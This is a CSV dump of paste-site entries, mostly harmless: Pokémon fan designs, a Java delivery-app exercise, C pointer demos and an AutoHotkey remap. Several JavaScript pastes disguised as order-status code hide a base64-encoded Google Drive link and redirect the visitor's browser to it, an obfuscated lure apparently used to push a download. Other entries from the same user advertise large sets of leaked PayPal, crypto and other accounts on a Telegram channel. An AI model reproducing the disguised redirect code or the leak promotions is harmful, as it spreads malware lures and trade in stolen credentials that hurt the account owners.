id,title,username,language,date,content
a6GaCnMJ,Products.js,x2LeaF,JavaScript,Saturday 26th of April 2025 10:24:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72409/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BHTJmcN2,Rrrrrr,Rakibmunshi721,JSON,Saturday 26th of April 2025 10:11:16 AM CDT,"{
  ""title"": ""⚡Ads Verification⚡"",
  ""message"": ""All text and titles can be replaced with json\nworking on the app right now\n🌟 Add Your text\n🌟 Add your text\n🌟 Add your text\n🌟 Add your text"",
  ""telegramLink"": ""t.me/your_channel"",
  ""whatsappLink"": ""wa.me/your_number"",
  ""youtubeLink"": ""youtube.com/your_channel"",
  ""showUpdate"": false,
  ""updateLink"": ""yourdomain.com/update.apk"",
  ""showVerify"": true,
  ""serverLinks"": {
    ""server1"": {
      ""startUrl"": ""https://www.deviceinfo.me/"",
      ""verifyUrl"": ""test""
    },
    ""server2"": {
      ""startUrl"": ""https://www.whatismybrowser.com/"",
      ""verifyUrl"": ""Ansari.com""
    },
    ""server3"": {
      ""startUrl"": ""https://browserleaks.com/"",
      ""verifyUrl"": ""test""
    }
  }
}"
Ld9v1DXm,Order.js,x2LeaF,JavaScript,Saturday 26th of April 2025 10:09:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08689/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JpKvgXvP,Market.js,x2LeaF,JavaScript,Saturday 26th of April 2025 09:53:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64184/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zSPj7Urw,Untitled,x2LeaF,JavaScript,Saturday 26th of April 2025 09:38:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53232/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pUW0BEte,Crypto Accounts,x2LeaF,JavaScript,Saturday 26th of April 2025 09:31:27 AM CDT,03414 Accounts Posted On https://t.me/leakedbyem1nem
aKYMXDPT,Recurshen,Dunscy,Python,Saturday 26th of April 2025 09:29:13 AM CDT,"Terrachic
Grass chick pokemon 

Grass
40/20/25/20/25/25
Regenerator / earth eater // rocky payload 

dex :
(solar): they are very weak by themselves, so they flock to agavhen for protection.
(hydro): they need little food or light, so they live all over the region

Every move in the line can be learned as terrachic 


Agavhen
Stonecrop pokemon 

Grass/rock
75/63/70/56/69/34
Regenerator / regrowth (!) // friend guard

dex:
(solar): one agavhen may carry as many as 40 terrachik in its thorny plumage
(Hydro): it can subsist entirely on sunlight and small stones or soil

Recurshen
recursive pokemon 

Grass/rock 
88/95/100/70/95/35
Regenerator /regrowth (!) // friend guard 

Dex: 
(solar): it spends most of its free time training its children to protect their children and other small pokemon
(hydro): research has yet to find an end to the space in its tail, but drones have found berries that can only be eaten by the terrachik line

(!) Regrowth: when fainting, swap forms and fully recover hp. New form has identical stats, typing, and ability as previous evolution counts as a faint for last respects/revenge. Will chain if possible, but if not (slot 3>2>1)

movelist:
Terablast
Hidden Power
Rest
Protect
Endure
Substitute
Attract
Captivate
Double Team
Facade
Round
Swagger
Sleep Talk
Confide
after you 
baton pass 
body slam 
defence curl 
egg bomb 
encore
endeavor
endure
flail
focus energy
follow me
fury attack
glare
growth
heal bell
helping hand
mean look
pain split
retaliate
tackle
pin missile
beat up
hone claws
scale shot
play rough
body press
bulk up
final gambit
no retreat
sunny day
drill peck
feather dance
peck
roost
wing attack
curse
grudge
last respects
spite
absorb
bullet seed
grass knot
grassy terrain
ingrain
leaf blade
leaf tornado
leafage
magical leaf
seed bomb
solar beam
solar blade
trailblaze
ancient power
power gem
rock blast
rock slide
rollout
smack down
stealth rock
wide guard
bulldoze
Earthquake
rototiller
zen headbutt
rain dance"
dE5uttYt,PayPal with Balance,x2LeaF,JavaScript,Saturday 26th of April 2025 09:16:05 AM CDT,14734 Accounts Posted On https://t.me/leakedbyem1nem
6iHaWrBE,[NP] Delivery App,dzocesrce,Java,Saturday 26th of April 2025 09:15:08 AM CDT,"//most fatigued one yet
import java.util.*;
import java.util.stream.Collectors;

class User implements Comparable<User> {
    String id;
    String name;
    double moneySpent;
    int deliveries;

    public User(String id, String name) {
        this.id = id;
        this.name = name;
        this.moneySpent=0;
        this.deliveries=0;
    }

    public String getId() {
        return id;
    }

    public int getDeliveries() {
        return deliveries;
    }

    public String getName() {
        return name;
    }

    public void addDeliveries() {
        this.deliveries++;
    }

    public void addMoney(double amount) {
        moneySpent += amount;
    }

    public double getMoneySpent(){
        return moneySpent;
    }

    private double getAverageAmountSpent() {
        if(getDeliveries()==0)
            return 0;
        return getMoneySpent()/getDeliveries();
    }

    @Override
    public String toString() {
        return String.format(""ID: %s Name: %s Total orders: %d Total amount spent: %.2f Average amount spent: %.2f"",
                getId(),getName(),getDeliveries(),getMoneySpent(),getAverageAmountSpent());
    }

    @Override
    public int compareTo(User o) {
        return Comparator.comparing(User::getMoneySpent).reversed()
                .thenComparing(User::getName,Comparator.reverseOrder())
                .compare(this,o);
    }

}
class Restoraunt implements Comparable<Restoraunt>,Location{
    String id;
    String name;
    Location location;
    double moneyEarned;
    int deliveries;

    public Restoraunt(String id, String name, Location location) {
        this.id = id;
        this.name = name;
        this.location = location;
        this.moneyEarned = 0;
        this.deliveries= 0;
    }

    public void addMoney(double money) {
        this.moneyEarned += money;
    }

    public void addDeliveries(){
        this.deliveries++;
    }

    public double getAverageAmountEarned() {
        if(getDeliveries()==0)
            return 0;
        return getMoneyEarned()/getDeliveries();
    }

    public double getMoneyEarned() {
        return moneyEarned;
    }

    public int getDeliveries() {
        return deliveries;
    }

    public String getId() {
        return id;
    }

    public String getName() {
        return name;
    }

    public Location getLocation() {
        return location;
    }

    @Override
    public String toString() {
        return String.format(""ID: %s Name: %s Total orders: %d Total amount earned: %.2f Average amount earned: %.2f"",
                getId(),getName(),getDeliveries(),getMoneyEarned(),getAverageAmountEarned());
    }

    @Override
    public int compareTo(Restoraunt o) {
        return Comparator.comparing(Restoraunt::getAverageAmountEarned)
                .reversed()
                .thenComparing(Restoraunt::getName,Comparator.reverseOrder())
                .compare(this,o);
    }

    @Override
    public int getX() {
        return location.getX();
    }

    @Override
    public int getY() {
        return location.getY();
    }

    @Override
    public int distance(Location location) {
        return Location.super.distance(location);
    }
}
class LocationCreator {
    public static Location create(int x, int y) {

        return new Location() {
            @Override
            public int getX() {
                return x;
            }

            @Override
            public int getY() {
                return y;
            }
        };
    }
}
interface Location {
    int getX();

    int getY();

    default int distance(Location other) {
        int xDiff = Math.abs(getX() - other.getX());
        int yDiff = Math.abs(getY() - other.getY());
        return xDiff + yDiff;
    }
}

class DeliveryPerson implements Comparable<DeliveryPerson>,Location{
    String id;
    String name;
    Location location;
    double moneyEarned;
    int deliveries;

    public DeliveryPerson(String id, String name, Location location) {
        this.id = id;
        this.name = name;
        this.location = location;
        this.moneyEarned = 0;
        this.deliveries = 0;
    }

    public void addDeliveries() {
        this.deliveries++;
    }

    public int getDeliveries() {
        return deliveries;
    }

    public void setLocation(Location location) {
        this.location = location;
    }

    public void addMoney(double amount) {
        moneyEarned += amount;
    }

    public double getMoneyEarned() {
        return moneyEarned;
    }

    public String getId() {
        return id;
    }

    public String getName() {
        return name;
    }

    public Location getLocation() {
        return location;
    }


    public double getAverageAmountEarned() {
        if(getDeliveries()==0)
            return 0;
        return getMoneyEarned()/getDeliveries();
    }


    @Override
    public String toString() {
        return String.format(""ID: %s Name: %s Total deliveries: %d Total delivery fee: %.2f Average delivery fee: %.2f"",
                getId(),getName(),getDeliveries(),getMoneyEarned(),getAverageAmountEarned());
    }
    
    @Override
    public int compareTo(DeliveryPerson o) {
        return Comparator.comparing(DeliveryPerson::getMoneyEarned).reversed()
                .thenComparing(DeliveryPerson::getName,Comparator.reverseOrder()).compare(this,o);
    }

    @Override
    public int getX() {
        return location.getX();
    }

    @Override
    public int getY() {
        return location.getY();
    }

    @Override
    public int distance(Location location) {
        return Location.super.distance(location);
    }
}

public class DeliveryAppTester {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        String appName = sc.nextLine();
        DeliveryApp app = new DeliveryApp(appName);
        while (sc.hasNextLine()) {
            String line = sc.nextLine();
            String[] parts = line.split("" "");

            if (parts[0].equals(""addUser"")) {
                String id = parts[1];
                String name = parts[2];
                app.addUser(id, name);
            } else if (parts[0].equals(""registerDeliveryPerson"")) {
                String id = parts[1];
                String name = parts[2];
                int x = Integer.parseInt(parts[3]);
                int y = Integer.parseInt(parts[4]);
                app.registerDeliveryPerson(id, name, LocationCreator.create(x, y));
            } else if (parts[0].equals(""addRestaurant"")) {
                String id = parts[1];
                String name = parts[2];
                int x = Integer.parseInt(parts[3]);
                int y = Integer.parseInt(parts[4]);
                app.addRestaurant(id, name, LocationCreator.create(x, y));
            } else if (parts[0].equals(""addAddress"")) {
                String id = parts[1];
                String name = parts[2];
                int x = Integer.parseInt(parts[3]);
                int y = Integer.parseInt(parts[4]);
                app.addAddress(id, name, LocationCreator.create(x, y));
            } else if (parts[0].equals(""orderFood"")) {
                String userId = parts[1];
                String userAddressName = parts[2];
                String restaurantId = parts[3];
                float cost = Float.parseFloat(parts[4]);
                app.orderFood(userId, userAddressName, restaurantId, cost);
            } else if (parts[0].equals(""printUsers"")) {
                app.printUsers();
            } else if (parts[0].equals(""printRestaurants"")) {
                app.printRestaurants();
            } else {
                app.printDeliveryPeople();
            }

        }
    }
}

class DeliveryApp {
    String name;
    Map<String,User> users;
    Map<String,DeliveryPerson> deliverypersons;
    Map<String,Restoraunt> restoraunts;
    Map<String, Map<String,Address>> addresses;
    public static final int ORDER_AMOUNT=90;

    public DeliveryApp(String name) {
        this.name = name;
        users = new HashMap<String,User>();
        deliverypersons = new HashMap<String,DeliveryPerson>();
        restoraunts = new HashMap<String,Restoraunt>();
        addresses = new HashMap<String,Map<String,Address>>();
    }

    public void addUser(String id, String name) {
        users.putIfAbsent(id,new User(id,name));
    }

    public void registerDeliveryPerson(String id, String name, Location location) {
        deliverypersons.putIfAbsent(id,new DeliveryPerson(id,name,location));
    }

    public void addRestaurant(String id, String name, Location location) {
        restoraunts.putIfAbsent(id,new Restoraunt(id,name,location));
    }

    public void addAddress(String id, String name, Location location) {
        addresses.putIfAbsent(id,new HashMap<>());
        addresses.get(id).putIfAbsent(name,new Address(name,location));
    }

    public void orderFood(String userId, String userAddressName, String restaurantId, float cost) {
        Location userLocation = addresses.get(userId).get(userAddressName).getLocation();
        DeliveryPerson deliveryPerson = getClosest(restaurantId);
        Location deliveryLocation = deliveryPerson.getLocation();
        deliverypersons.get(deliveryPerson.getId()).setLocation(userLocation);
		//this is the only flawed compute logic... not able to figure it out yet but it's good enough per Test Cases
        deliverypersons.get(deliveryPerson.getId()).addMoney(ORDER_AMOUNT+(deliveryLocation.distance(restoraunts.get(restaurantId).getLocation())/10)*10);
        deliverypersons.get(deliveryPerson.getId()).addDeliveries();
        users.get(userId).addMoney(cost);
        users.get(userId).addDeliveries();
        restoraunts.get(restaurantId).addMoney(cost);
        restoraunts.get(restaurantId).addDeliveries();
        deliveryPerson.setLocation(userLocation);
    }

    private DeliveryPerson getClosest(String restaurantId) {
        Location resLocation = restoraunts.get(restaurantId).getLocation();

        List<DeliveryPerson> closestDeliveryPerson = deliverypersons.values().stream().sorted(Comparator
                .comparing(i -> i.getLocation().distance(resLocation),Comparator.naturalOrder()))
             //   .sorted(Comparator.comparing(i->i.getDeliveries(),Comparator.reverseOrder()))
                .collect(Collectors.toList());

		//since I could not use thenComparing, or didn't know exactly how to, I manually do another sort if needed.
        if(closestDeliveryPerson.get(0).distance(resLocation)==closestDeliveryPerson.get(1).distance(resLocation))
            closestDeliveryPerson = deliverypersons.values().stream()
                    .sorted(Comparator.comparing(i->i.getDeliveries(),Comparator.naturalOrder()))
                    .collect(Collectors.toList());

        return closestDeliveryPerson.get(0);
    }

    public void printUsers() {
        users.values().stream().sorted().forEach(i-> System.out.println(i));
    }

    public void printRestaurants() {
        restoraunts.values().stream().sorted().forEach(i-> System.out.println(i));
    }

    public void printDeliveryPeople() {
        deliverypersons.values().stream().sorted().forEach(i-> System.out.println(i));
    }
}

class Address {
    String addressName;
    Location location;

    public Address(String addressName, Location location) {
        this.addressName = addressName;
        this.location = location;
    }

    public String getAddressName() {
        return addressName;
    }

    public Location getLocation() {
        return location;
    }
}
"
0mVXiBbe,Untitled,dllbridge,C,Saturday 26th of April 2025 09:14:42 AM CDT,"

#include <iostream>
#include  <iomanip>
#include <string.h>
using namespace std;

void foo(char *sz);




////////////////////////////////////////////////////////////
int main() 
{

    char sz[99] = ""SONY Pictures"";
    
   // cout << ""Size of sz = "" << sizeof(sz) << endl;
 
    foo(sz);
}




////////////////////////////////////////////////////////////
void foo(char *sz)
{
     
     int nLen = strlen(sz);
     
    for(int i = 0; i < nLen; i++)
    {
        cout << ""sz["" << setw(2) << i << ""] = "" << sz[i] << endl;
    }     
     
     
}












/*
#include <iostream>
using namespace std;

void foo(int *nArr);




////////////////////////////////////////////////////////////
int main() 
{

    int nArr[5] = {7, 2, 2147483647, 21, 9};
    
    int n;
    
    cout << ""Size of nArr[2] = "" << sizeof(nArr  ) << endl;
    cout << ""Size of double  = "" << sizeof(double) << endl;    
    cout << ""Size of char    = "" << sizeof(char  ) << endl;     
    foo(nArr);
}




////////////////////////////////////////////////////////////
void foo(int *n_Arr)
{
     
     
     
}


*/




















/*
#include <iostream>
using namespace std;

void foo(int *nArr);




////////////////////////////////////////////////////////////
int main() 
{

    int nArr[5] = {7, 2, 2147483647, 21, 9};
    
    
    foo(nArr);
}




////////////////////////////////////////////////////////////
void foo(int *n_Arr)
{
     
     int *p = &n_Arr[2];
     
     cout << ""nArr[2] = "" <<      p[-2]   << endl; 
     cout << ""nArr[2] = "" <<  n_Arr[ 0]   << endl; 	p -= 2;
     cout << ""nArr[2] = "" <<     *p       << endl;	     
}


*/








/*
#include <iostream>
using namespace std;

void foo(int *nArr);




////////////////////////////////////////////////////////////
int main() 
{

    int nArr[5] = {33, 2, 2147483647, 21, 9};
    
    
    foo(nArr);
}




////////////////////////////////////////////////////////////
void foo(int *n_Arr)
{
     
     int *p = &n_Arr[2];
     
     cout << ""nArr[2] = "" <<      p[-2]   << endl; 
     cout << ""nArr[2] = "" <<  n_Arr[ 0]   << endl; 	p = &n_Arr[0];
     cout << ""nArr[2] = "" <<     *p       << endl;	     
}


*/











/*

#include <iostream>
using namespace std;



////////////////////////////////////////////////////////////
int main() 
{

    int nArr[5] = {33, 2, 7, 21, 9};
    
    int *p = &nArr[2];
    
    cout << ""nArr[2] = "" <<     p[0]   << endl; 
    cout << ""nArr[2] = "" <<  nArr[2]   << endl; 	
    cout << ""nArr[2] = "" <<    *p      << endl;	

}
*/











/*
#include <iostream>
using namespace std;


int  n = 2271;
int *p = &n;




////////////////////////////////////////////////////////////
int main() 
{

  
    
    cout << ""n = "" << *p    << endl; 
    cout << ""n = "" <<  n    << endl; 	
    cout << ""n = "" <<  p[0] << endl;	

}

*/



"
jACZ3WSV,Granboar,Dunscy,Python,Saturday 26th of April 2025 09:14:24 AM CDT,"Granboar (Granite + Boar)

**Type:** Rock
**Stats:** 125 / 90 / 120 / 55/ 75 / 50 // 515 BST
**Abilities** Sturdy/Stamina//Solid Rock

**Dex:** Packs of these behemoths are often mistaken for boulder fields left by landslides as they tend not to move much. Their rocky hide is so thick they hardly notice if a climber hammers in a tie off for climbing. 

**Learnset:**

Ancient Power
Attract
Belch
Bide
Bite
Block 
Body Press
Body Slam
Boulder Bash
Bulldoze
Bulk Up
Chip Away
Confide
Counter
Crunch
Curse
Double Team
Double-Edge
Earth Power
Earthquake
Endure
Facade
Fire Fang
Fissure
Focus Blast
Frustration
Giga Impact
Hard Press
Harden
Head Smash
Headbutt
Heat Crash
Heavy Slam
Helping Hand
Hidden Power
High Horsepower
Hyper Beam
Ice Fang
Iron Defense
Iron Head
Lash Out
Megahorn
Meteor Beam
Mud Shot
Mud Slap
Mud Sport
Odor Sleuth
Play Rough
Power Gem
Protect
Rest
Roar
Rock Blast
Rock Polish
Rock Slide
Rock Smash
Rock Throw
Rock Tomb
Rollout
Rototiller
Sandstorm
Scary Face
Slack Off
Sleep Talk
Smack Down
Spikes
Stealth Rock
Stomping Tantrum
Stone Edge
Strength
Substitute
Superpower
Swagger
Tackle
Take Down
Tera Blast
Thunder Fang
Toxic
Trailblaze
Wide Guard
Work Up
Yawn

Pebblet (Pebble/Piglet)
**Type:** Rock
**Stats:** 80/50/60/25/50/50 // 315
**Abilities** Sturdy/Reckless// Solid Rock

Unlike it's evolution, Pebblet love to run around, rolling down the hills and slopes near their pack. They are a bit too playful at times and have been known to run into passing hikers

**Learnset:**

Ancient Power
Attract
Belch
Bide
Bite
Block 
Body Slam
Boulder Bash
Bulldoze
Bulk Up
Chip Away
Confide
Counter
Curse
Double Team
Earthquake
Endure
Facade
Focus Blast
Frustration
Harden
Headbutt
Helping Hand
Hidden Power
High Horsepower
Iron Defense
Iron Head
Lash Out
Mud Shot
Mud Slap
Mud Sport
Odor Sleuth
Play Rough
Power Gem
Protect
Rest
Roar
Rock Blast
Rock Polish
Rock Slide
Rock Smash
Rock Throw
Rock Tomb
Rollout
Rototiller
Sandstorm
Scary Face
Slack Off
Sleep Talk
Smack Down
Spikes
Stealth Rock
Stomping Tantrum
Stone Edge
Strength
Substitute
Superpower
Swagger
Tackle
Take Down
Tera Blast
Toxic
Trailblaze
Wide Guard
Work Up
Yawn"
BUuRQngU,PoE2 - Rebind Shift with Space and vice-versa,Pandamonium_42,Autohotkey,Saturday 26th of April 2025 09:11:01 AM CDT,"#Persistent
#SingleInstance Force

; Check active window every 5ms
SetTimer, CheckWindow, 5
return

CheckWindow:
    WinGet, pid, PID, A
    if (pid) {
        Process, Exist, pathofexilesteam.exe
        if (pid == ErrorLevel) {
            ; Remap inside the game
            Hotkey, *Space, SpaceAsShift, On
            Hotkey, *Shift, ShiftAsSpace, On
            return
        }
    }
    ; Otherwise, turn remaps off
    Hotkey, *Space, SpaceAsShift, Off
    Hotkey, *Shift, ShiftAsSpace, Off
return

SpaceAsShift:
    Send {Shift down}
    KeyWait, Space
    Send {Shift up}
return

ShiftAsSpace:
    Send {Space down}
    KeyWait, Shift
    Send {Space up}
return"
GqEYhjKb,Leaked Accounts - Fresh Hits,x2LeaF,JavaScript,Saturday 26th of April 2025 09:00:41 AM CDT,56975 Accounts Posted On https://t.me/leakedbyem1nem
